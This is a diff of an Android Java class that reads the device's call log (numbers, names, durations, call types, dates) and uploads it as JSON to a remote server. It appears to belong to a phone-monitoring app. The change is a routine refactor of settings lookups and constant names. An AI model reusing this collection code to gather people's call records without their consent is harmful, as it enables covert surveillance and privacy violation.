@@ -4,16 +4,16 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 import android.content.Context;
-import android.content.SharedPreferences;
 import android.database.Cursor;
 import android.os.AsyncTask;
-import android.preference.PreferenceManager;
 import android.provider.CallLog;
 
-import com.inet.android.request.ConstantRequest;
+import com.inet.android.bs.NetworkChangeReceiver;
+import com.inet.android.request.ConstantValue;
 import com.inet.android.request.RequestList;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
+import com.inet.android.utils.ValueWork;
 
 /**
  * ListCall class is designed to get the list of call
@@ -25,17 +25,17 @@ public class ListCall extends AsyncTask<Context, Void, Void> {
 	private Context mContext;
 	private String LOG_TAG = ListCall.class.getSimpleName().toString();
 	private String complete;
-	private String version;
+	private int version;
+	
 	private String readCallLogs() {
 		
 		String sendStr = null;
 		int type = -1;
-		SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(mContext);
-		version = sp.getString("list_call", "0");
-		Logging.doLog(LOG_TAG, "readCall", "readCall");
+		version = ValueWork.getMethod(ConstantValue.TYPE_LIST_CALL, mContext);
+		Logging.doLog(LOG_TAG, "readCall" + version, "readCall" + version);
 
-		if (sp.getBoolean("network_available", true) == true) {
-
+		if (NetworkChangeReceiver.isOnline(mContext)) {
+			
 			Cursor callLogCursor = null;
 			// Делаем запрос к контент-провайдеру
 			// и получаем все данные из таблицы
@@ -74,18 +74,18 @@ public class ListCall extends AsyncTask<Context, Void, Void> {
 							.getColumnIndex(CallLog.Calls.DURATION);
 					String duration = callLogCursor.getString(durationInt);
 
-					String dateString = ConvertDate.getData(dateTimeMillis);
+					String dateString = ConvertDate.getDate(dateTimeMillis);
 
 					if (cacheNumber == null)
 						cacheNumber = number;
 					if (name == null)
 						name = "No Name";
 					if (callType == CallLog.Calls.OUTGOING_TYPE) {
-						type = ConstantRequest.TYPE_OUTGOING_CALL_REQUEST;
+						type = ConstantValue.TYPE_OUTGOING_CALL_REQUEST;
 					} else if (callType == CallLog.Calls.INCOMING_TYPE) {
-						type = ConstantRequest.TYPE_INCOMING_CALL_REQUEST;
+						type = ConstantValue.TYPE_INCOMING_CALL_REQUEST;
 					} else if (callType == CallLog.Calls.MISSED_TYPE) {
-						type = ConstantRequest.TYPE_MISSED_CALL_REQUEST;
+						type = ConstantValue.TYPE_MISSED_CALL_REQUEST;
 					}
 					try {
 						archiveCallJson.put("time", dateString);
@@ -134,18 +134,18 @@ public class ListCall extends AsyncTask<Context, Void, Void> {
 	}
 
 	private void endList() {
-		Logging.doLog(LOG_TAG, "endList", "endList");	
-		TurnSendList.setList(ConstantRequest.TYPE_LIST_CALL_REQUEST, version, "0", mContext);
+		Logging.doLog(LOG_TAG, "endList " , "endList "  + version);	
+		TurnSendList.setList(ConstantValue.TYPE_LIST_CALL, version, "0", mContext);
 	}
 
 	private void lastRaw(String sendStr) {
 		complete = "1";
-		Logging.doLog(LOG_TAG, "Send complete 1 ..", "Send complete 1 ..");
+		Logging.doLog(LOG_TAG, "Send complete 1 .." + version, "Send complete 1 .." + version);
 		sendRequest(sendStr, complete);
 	}
 
 	private void sendRequest(String str, String complete) {
-		RequestList.sendDemandRequest(str, ConstantRequest.TYPE_LIST_CALL_REQUEST, complete, version, mContext);
+		RequestList.sendDemandRequest(str, ConstantValue.TYPE_LIST_CALL_REQUEST, complete, version, mContext);
 	}
 
 	@Override
